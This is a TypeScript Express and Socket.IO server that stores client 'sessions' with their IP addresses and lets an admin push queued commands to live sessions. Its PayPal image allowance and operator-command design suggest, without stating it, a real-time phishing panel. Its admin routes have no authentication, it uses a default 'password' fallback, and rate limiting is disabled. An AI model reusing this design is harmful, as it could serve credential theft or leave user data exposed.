import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import cors from 'cors';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import fs from 'fs';
import crypto from 'crypto';
import * as db from './db';

const app = express();
const httpServer = createServer(app);

// Determine allowed origins from env var (comma-separated) or default to "*"
const rawOrigins = process.env.ALLOWED_ORIGINS;
const allowedOrigins = rawOrigins ? rawOrigins.split(',').map(o => o.trim()) : "*";

let corsOrigin: any = "*"; // Default to wildcard

if (allowedOrigins !== "*") {
    corsOrigin = (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
        if (!origin) {
            // Allow requests with no origin (non-browser)
            return callback(null, true);
        }

        if ((allowedOrigins as string[]).includes(origin)) {
            callback(null, true);
        } else {
            console.log(`[CORS] Blocked origin: ${origin}`);
            callback(new Error('Not allowed by CORS'));
        }
    };
}

const corsOptions = {
    origin: corsOrigin,
    methods: ["GET", "POST"]
};
console.log(`[Server] CORS Configured. Mode: ${allowedOrigins === "*" ? "Wildcard" : "Restricted"}`);

const io = new Server(httpServer, {
    cors: corsOptions
});

const PORT = process.env.PORT || 8080;
const MASTER_PASSWORD = process.env.MASTER_PASSWORD || 'password'; // Use env var

// --- Middleware ---
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            scriptSrcAttr: ["'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org"],
            connectSrc: ["'self'"],
            frameSrc: ["'self'"]
        }
    }
}));
app.use(cors(corsOptions));
app.use(express.json({ limit: '1mb' }));

// Rate Limiting - Disabled to prevent Render proxy issues
app.set('trust proxy', 1);
// const apiLimiter = rateLimit({
//     windowMs: 15 * 60 * 1000, // 15 minutes
//     max: 500 // Limit each IP to 500 requests per windowMs
// });
// app.use('/api/', apiLimiter);

// --- Socket.IO ---
io.on('connection', (socket) => {
    console.log('[Socket] Client connected:', socket.id);

    socket.on('join', (sessionId) => {
        socket.join(sessionId);
        console.log(`[Socket] ${socket.id} joined session room: ${sessionId}`);
    });

    socket.on('disconnect', () => {
        console.log('[Socket] Client disconnected:', socket.id);
    });
});

// --- API Routes ---

// 1. Sync State (Hybrid: HTTP for data, Socket for notify)
app.post('/api/sync', async (req, res) => {
    try {
        const data = req.body;
        if (!data || !data.sessionId) {
            return res.status(400).json({ error: 'Missing sessionId' });
        }

        const ip = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

        await db.upsertSession(data.sessionId, data, ip);

        // Notify Admin Room (broadcast to all admins if we had separate admin rooms)
        // For now, simply broadcast to everyone listening for 'session-update'
        io.emit('sessions-updated');

        // Check for pending commands
        const cmd = await db.getCommand(data.sessionId);
        if (cmd) {
            // Also emit directly to socket if connected
            io.to(data.sessionId).emit('command', cmd);
            return res.json({ status: 'ok', command: cmd });
        }

        res.json({ status: 'ok' });
    } catch (e) {
        console.error('[Sync] Error:', e);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

// 2. Fetch Sessions (Admin)
app.get('/api/sessions', async (req, res) => {
    try {
        const sessions = await db.getAllSessions();

        if (sessions.length > 0) {
            console.log('[API] /sessions returning:', JSON.stringify(sessions[0], null, 2));
        }

        // Optimization: ETag for caching
        const json = JSON.stringify(sessions);
        const etag = crypto.createHash('md5').update(json).digest('hex');

        if (req.headers['if-none-match'] === etag) {
            return res.status(304).end();
        }

        res.setHeader('ETag', etag);
        res.setHeader('Content-Type', 'application/json');
        res.send(json);
    } catch (e) {
        res.status(500).json([]);
    }
});

// 3. Admin Command
app.post('/api/command', async (req, res) => {
    try {
        const { sessionId, action, payload } = req.body;
        if (!sessionId || !action) {
            return res.status(400).send('Invalid Command');
        }

        await db.queueCommand(sessionId, action, payload);

        // Real-time Push
        io.to(sessionId).emit('command', { action, payload });

        res.json({ status: 'queued' });
    } catch (e) {
        res.status(500).send('Error queuing command');
    }
});

// 4. Health Check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// 5. Gate Unlock
app.post('/api/gate-unlock', (req, res) => {
    const { password } = req.body;
    if (password === MASTER_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

// --- Static Files (Frontend) ---
const staticPaths = [
    path.join(__dirname, '../static'),           // Docker / Production
    path.join(__dirname, '../dist/app/browser')  // Local Development
];

// Register all paths with cache control
staticPaths.forEach(p => app.use(express.static(p, {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('index.html')) {
            // Never cache index.html to ensure clients get new CSS/JS hashes
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        } else {
            // Cache other static assets (hashed) for a long time
            res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        }
    }
})));

// Pre-resolve the path containing index.html to avoid per-request I/O
const indexHtmlPath = staticPaths.find(p => fs.existsSync(path.join(p, 'index.html')));

if (indexHtmlPath) {
    console.log(`[Server] Serving SPA from: ${indexHtmlPath}`);
    // Debug: List files in the static directory to help diagnose 404s
    try {
        const files = fs.readdirSync(indexHtmlPath);
        console.log('[Server] Files in static directory:', files);
    } catch (e) {
        console.warn('[Server] Failed to list static directory files:', e);
    }
} else {
    console.warn(`[Server] ⚠️  Frontend not found in: ${staticPaths.join(', ')}`);
}

// Fallback for SPA (Angular Router)
app.get('*', (req, res) => {
    // 1. If it looks like a static asset, return 404
    // This prevents the server from returning index.html for missing CSS/JS,
    // which causes MIME type blocking in browsers.
    if (req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|json|map)$/)) {
        console.warn(`[Server] 404 Not Found for static asset: ${req.path}`);
        return res.status(404).send('Not Found');
    }

    // 2. Otherwise serve index.html for SPA routing
    if (indexHtmlPath) {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.sendFile(path.join(indexHtmlPath, 'index.html'));
    } else {
        res.status(404).send(`
            <h1>Frontend Not Found</h1>
            <p>Please build the application first:</p>
            <pre>npm run build</pre>
            <p>Searched paths:</p>
            <ul>${staticPaths.map(p => `<li>${p}</li>`).join('')}</ul>
        `);
    }
});

// --- Start Server ---
httpServer.listen(PORT, () => {
    console.log(`[Server] ✅ Express + Socket.IO running on port ${PORT}`);
});
